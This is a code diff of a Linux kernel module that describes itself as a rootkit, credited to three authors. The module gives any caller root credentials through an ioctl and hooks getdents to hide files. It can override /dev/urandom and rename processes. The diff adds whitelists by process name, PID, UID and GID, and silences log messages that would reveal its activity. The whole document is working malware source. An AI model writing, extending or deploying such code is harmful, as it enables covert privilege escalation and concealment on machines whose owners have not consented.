@@ -13,7 +13,10 @@
 #include <crypto/chacha.h>
 #include "bdoor.h"
 #include "bdoor_common.h"
-
+#ifdef CONFIG_X86_64
+#include "hidden_entry.h"
+#include "whitelist.h"
+#endif
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Ethan, Cyrus, and Nick");
 MODULE_DESCRIPTION("rootkit kernel module");
@@ -40,8 +43,6 @@ static void save_old_creds(struct cred *cur_creds)
 static long root_ioctl(struct file *file, unsigned long arg)
 {
 	struct cred *root;
-	printk(KERN_INFO "current_pid:%d\n",current->pid);
-	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);
 	root = prepare_creds();
 
 	//dunno which type of error to return if this fails, but this one seems good
@@ -60,7 +61,7 @@ static long root_ioctl(struct file *file, unsigned long arg)
 	root->fsuid.val = root->fsgid.val = 0;
 
 	commit_creds(root);
-	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
+	//printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
 out:
 	return 0;
 }
@@ -68,9 +69,6 @@ out:
 static long unroot_ioctl(struct file *file, unsigned long arg)
 {
 	struct cred *orig;
-
-	printk(KERN_INFO "current_pid:%d\n",current->pid);
-	printk(KERN_INFO "current_uid:%d\n",({current_uid();}).val);
 
 	if (!creds_were_saved) {
 		printk(KERN_INFO "ROOTKIT: YOU HAVEN'T ROOTED YOURSELF YET\n");
@@ -93,7 +91,6 @@ static long unroot_ioctl(struct file *file, unsigned long arg)
 	orig->fsgid.val = old_creds.fsgid.val;
 
 	commit_creds(orig);
-	printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
 out:
 	return 0;
 }
@@ -137,11 +134,11 @@ static long urand_ioctl(struct file *file, unsigned long arg)
 #ifdef CONFIG_X86_64
 	long err = 0;
 	if (urand_overridden) {
-		printk("ROOTKIT: restoring urandom\n");
+		//printk("ROOTKIT: restoring urandom\n");
 		fh_remove_hook(&urand_hook);
 		urand_overridden = false;
 	} else {
-		printk("ROOTKIT: overriding urandom\n");
+		//printk("ROOTKIT: overriding urandom\n");
 		err = (long)fh_install_hook(&urand_hook);
 		if (err) {
 			printk("ROOTKIT: failed to override urandom\n");
@@ -155,80 +152,6 @@ out:
 	return -ENOTSUP;
 #endif
 }
-
-#ifdef CONFIG_X86_64
-
-int cmp_dentry_identifier(struct dentry_identifier *d_id1,
-                          struct dentry_identifier *d_id2)
-{
-        return memcmp(d_id1,d_id2,sizeof(struct dentry_identifier));
-}
-
-struct hidden_entry {
-        struct dentry_identifier id;
-        spinlock_t lock;
-        struct rhash_head node;
-        atomic_t users;
-};
-
-struct rhashtable_params hidden_table_params = {
-        .key_len = sizeof(struct dentry_identifier),
-        .key_offset = offsetof(struct hidden_entry,id),
-        .head_offset = offsetof(struct hidden_entry,node)
-};
-
-atomic_t hidden_table_users;
-struct rhashtable hidden_table;
-spinlock_t hidden_table_lock;
-
-static struct hidden_entry *req_to_entry(struct dentry_identifier *orig_id)
-{
-	struct hidden_entry *ret = kmalloc(sizeof(struct hidden_entry),GFP_ATOMIC);
-	memcpy(&ret->id,orig_id,sizeof(struct dentry_identifier));
-	spin_lock_init(&ret->lock);
-	return ret;
-}
-
-static void hidden_table_free_entry(void *ptr, void *arg)
-{
-	struct hidden_table *entry = (struct hidden_table*)ptr;
-	kfree(entry);
-}
-
-static void add_hidden_entry_to_table(struct dentry_identifier *identifier)
-{
-	int err;
-	struct hidden_entry *new_entry = req_to_entry(identifier);
-	atomic_inc(&hidden_table_users);
-	err = rhashtable_lookup_insert_fast(&hidden_table,
-					&new_entry->node,
-					hidden_table_params);
-
-	if (err)
-		kfree(new_entry);
-
-	atomic_dec(&hidden_table_users);
-}
-
-static int process_hide_request(struct hide_request *request)
-{
-	int i;
-	int ret = 0;
-	struct dentry_identifier *entries = kmalloc(request->count *
-						sizeof(struct dentry_identifier),
-						GFP_ATOMIC);
-	if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
-				request->count * sizeof(struct dentry_identifier))) {
-		ret = 1;
-		goto out;
-	}
-	for (i = 0; i < request->count; i++)
-		add_hidden_entry_to_table(&entries[i]);
-out:
-	kfree(entries);
-	return ret;
-}
-#endif
 
 static long hide_ioctl(struct file *file, unsigned long arg)
 {
@@ -248,45 +171,6 @@ out:
 #endif
 }
 
-#ifdef CONFIG_X86_64
-static void rem_hidden_entry_from_table(struct dentry_identifier *old_id)
-{
-	struct hidden_entry *old_entry;
-	atomic_inc(&hidden_table_users);
-	old_entry = rhashtable_lookup_fast(&hidden_table,
-					old_id,
-					hidden_table_params);
-	if (!old_entry)
-		goto out;
-
-	rhashtable_remove_fast(&hidden_table,
-			&old_entry->node,
-			hidden_table_params);
-	kfree(old_entry);
-out:
-	atomic_dec(&hidden_table_users);
-}
-
-
-static int process_show_request(struct hide_request *request)
-{
-	int i;
-	int ret = 0;
-	struct dentry_identifier *entries = kmalloc(request->count *
-						sizeof(struct dentry_identifier),
-						GFP_ATOMIC);
-	if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
-				request->count * sizeof(struct dentry_identifier))) {
-		ret = 1;
-		goto out;
-	}
-	for (i = 0; i < request->count; i++)
-		rem_hidden_entry_from_table(&entries[i]);
-out:
-	kfree(entries);
-	return ret;
-}
-#endif
 
 static long show_ioctl(struct file *file, unsigned long arg)
 {
@@ -359,40 +243,66 @@ out:
 	return ret;
 }
 
-#ifdef CONFIG_X86_64
-struct proc_dir_entry *hidden_file_viewer;
-
-static int hidden_proc_show(struct seq_file *p, void *v)
+static long whit_add_ioctl(struct file *file, unsigned long arg)
 {
-	struct rhashtable_iter iter;
-	struct dentry_identifier *dentry_id;
-	unsigned long flags;
-	seq_printf(p,"%-*s%-*s%-*s\n",
-		11,"DEVICE",
-		21,"INODE",
-		8,"NAME");
-	spin_lock_irqsave(&hidden_table_lock,flags);
-	atomic_inc(&hidden_table_users);
-	rhashtable_walk_enter(&hidden_table,&iter);
-	rhashtable_walk_start(&iter);
-
-	while((dentry_id = rhashtable_walk_next(&iter)) != NULL)
-	{
-		rhashtable_walk_stop(&iter);
-		seq_printf(p,"%-*u%-*lu%s\n",
-			11,dentry_id->device,
-			21,dentry_id->parent_ino,
-			dentry_id->name);
-		rhashtable_walk_start(&iter);
+#ifdef CONFIG_X86_64
+	long ret = 0;
+	struct white_request request;
+	if (copy_from_user(&request, (struct white_request*) arg,
+				sizeof(struct white_request))) {
+		ret = -EFAULT;
+		goto out;
 	}
-
-	rhashtable_walk_stop(&iter);
-	rhashtable_walk_exit(&iter);
-	atomic_dec(&hidden_table_users);
-	spin_unlock_irqrestore(&hidden_table_lock,flags);
-	return 0;
-}
+	process_wadd_request(&request);
+out:
+	return ret;
+#else
+	return -ENOTSUP;
 #endif
+}
+
+static long whit_rem_ioctl(struct file *file, unsigned long arg)
+{
+#ifdef CONFIG_X86_64
+	long ret = 0;
+	struct white_request request;
+	if (copy_from_user(&request, (struct white_request*) arg,
+				sizeof(struct white_request))) {
+		ret = -EFAULT;
+		goto out;
+	}
+	process_wrem_request(&request);
+out:
+	return ret;
+#else
+	return -ENOTSUP;
+#endif
+}
+
+static long whit_show_ioctl(struct file *file, unsigned long arg)
+{
+#ifdef CONFIG_X86_64
+	//long ret = 0;
+	return 0;
+#else
+	return -ENOTSUP;
+#endif
+}
+
+static long change_comm_ioctl(struct file *file, unsigned long arg)
+{
+	long ret = 0;
+	struct comm_name newname;
+
+	if (copy_from_user(&newname, (struct comm_name*) arg,
+				sizeof(struct comm_name))) {
+		ret = -EFAULT;
+		goto out;
+	}
+	memcpy(current->comm,newname.name,MIN(strlen(newname.name),TASK_COMM_LEN));
+out:
+	return ret;
+}
 
 static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
@@ -440,6 +350,21 @@ static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		ret = show_mod_ioctl(file,arg);
 		break;
 
+	case WHIT_ADD_IOCTL:
+		ret = whit_add_ioctl(file,arg);
+		break;
+
+	case WHIT_REM_IOCTL:
+		ret = whit_rem_ioctl(file,arg);
+		break;
+
+	case WHIT_SHOW_IOCTL:
+		ret = whit_show_ioctl(file,arg);
+		break;
+
+	case CHANGE_COMM_IOCTL:
+		ret = change_comm_ioctl(file,arg);
+		break;
 	default:
 		ret = -ENOTTY;
 	}
@@ -468,18 +393,6 @@ static struct miscdevice rkit_dev = {
         .name = BDOOR_DEV_NAME,
         .fops = &rkit_fops,
 	.mode = S_IRUSR | S_IWUSR | S_IROTH,
-};
-
-
-static int hidden_proc_open(struct inode *inode,struct file *file)
-{
-	return single_open(file,hidden_proc_show,NULL);
-}
-
-static const struct proc_ops hidden_ops = {
-	.proc_open = hidden_proc_open,
-	.proc_read=seq_read,
-	.proc_release=single_release,
 };
 
 #ifdef CONFIG_X86_64
@@ -515,6 +428,8 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 	unsigned long flags;
 
 	int ret = orig_getdents64(regs);
+	if (check_whitelist())
+		goto out;
 
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
 
@@ -590,6 +505,9 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
 
 	int ret = orig_getdents(regs);
 
+	if (check_whitelist())
+                goto out;
+
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
 
 	if ((ret <= 0) || (dirent_ker == NULL))
@@ -655,7 +573,7 @@ static struct ftrace_hook hooks[] = {
 static void remove_all_hooks(void)
 {
 	if (urand_overridden) {
-		printk("ROOTKIT: restoring urandom\n");
+		//printk("ROOTKIT: restoring urandom\n");
 		fh_remove_hook(&urand_hook);
 		urand_overridden = false;
 	}
@@ -664,18 +582,65 @@ static void remove_all_hooks(void)
 
 #endif //CONFIG_X86_64
 
+
+static void init_tables_and_locks(void)
+{
+	spin_lock_init(&hidden_table_lock);
+        atomic_set(&hidden_table_users,0);
+        rhashtable_init(&hidden_table,&hidden_table_params);
+
+        spin_lock_init(&procname_whitelist_lock);
+        atomic_set(&procname_whitelist_users,0);
+        rhashtable_init(&procname_whitelist,&procname_whitelist_params);
+
+        spin_lock_init(&pid_whitelist_lock);
+        atomic_set(&pid_whitelist_users,0);
+        rhashtable_init(&pid_whitelist,&pid_whitelist_params);
+
+        spin_lock_init(&uid_whitelist_lock);
+        atomic_set(&uid_whitelist_users,0);
+        rhashtable_init(&uid_whitelist,&uid_whitelist_params);
+
+        spin_lock_init(&gid_whitelist_lock);
+        atomic_set(&gid_whitelist_users,0);
+        rhashtable_init(&gid_whitelist,&gid_whitelist_params);
+}
+
+static void free_tables_and_locks(void)
+{
+	while(atomic_read(&hidden_table_users)){}
+        rhashtable_free_and_destroy(&hidden_table,hidden_table_free_entry,NULL);
+
+	while(atomic_read(&procname_whitelist_users)){}
+        rhashtable_free_and_destroy(&procname_whitelist,procname_whitelist_free_entry,NULL);
+
+	while(atomic_read(&pid_whitelist_users)){}
+        rhashtable_free_and_destroy(&pid_whitelist,pid_whitelist_free_entry,NULL);
+
+	while(atomic_read(&uid_whitelist_users)){}
+        rhashtable_free_and_destroy(&uid_whitelist,uid_whitelist_free_entry,NULL);
+
+	while(atomic_read(&gid_whitelist_users)){}
+        rhashtable_free_and_destroy(&gid_whitelist,gid_whitelist_free_entry,NULL);
+}
+
 static int __init rootkit_init(void)
 {
 	int error;
 	printk(KERN_INFO "rootkit init\n");
 #ifdef CONFIG_X86_64
-	spin_lock_init(&hidden_table_lock);
-	atomic_set(&hidden_table_users,0);
-	rhashtable_init(&hidden_table,&hidden_table_params);
+	init_tables_and_locks();
 
 	hidden_file_viewer = proc_create(procfs_file_name,0000,NULL,&hidden_ops);
-	if (!hidden_file_viewer)
-		return -ENOMEM;
+	if (!hidden_file_viewer) {
+		error = -ENOMEM;
+		goto hidden_proc_create_cleanup;
+	}
+	whitelist_viewer = proc_create(procfs_whitelist_name,0000,NULL,&whitelist_ops);
+	if (!whitelist_viewer) {
+		error = -ENOMEM;
+		goto whitelist_proc_create_cleanup;
+	}
 	error = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
 	if (error)
 		goto install_hooks_cleanup;
@@ -689,9 +654,11 @@ misc_register_cleanup:
 #ifdef CONFIG_X86_64
 	remove_all_hooks();
 install_hooks_cleanup:
+	proc_remove(whitelist_viewer);
+whitelist_proc_create_cleanup:
 	proc_remove(hidden_file_viewer);
-	while(atomic_read(&hidden_table_users)){}
-	rhashtable_free_and_destroy(&hidden_table,hidden_table_free_entry,NULL);
+hidden_proc_create_cleanup:
+	free_tables_and_locks();
 #endif
 	return error;
 }
@@ -700,8 +667,7 @@ static void __exit rootkit_exit(void)
 {
 	printk(KERN_INFO "rootkit exit\n");
 #ifdef CONFIG_X86_64
-	while(atomic_read(&hidden_table_users)){}
-	rhashtable_free_and_destroy(&hidden_table,hidden_table_free_entry,NULL);
+	free_tables_and_locks();
 
 	remove_all_hooks();
 #endif
@@ -709,6 +675,7 @@ static void __exit rootkit_exit(void)
 	misc_deregister(&rkit_dev);
 #ifdef CONFIG_X86_64
 	proc_remove(hidden_file_viewer);
+	proc_remove(whitelist_viewer);
 #endif
 }
 
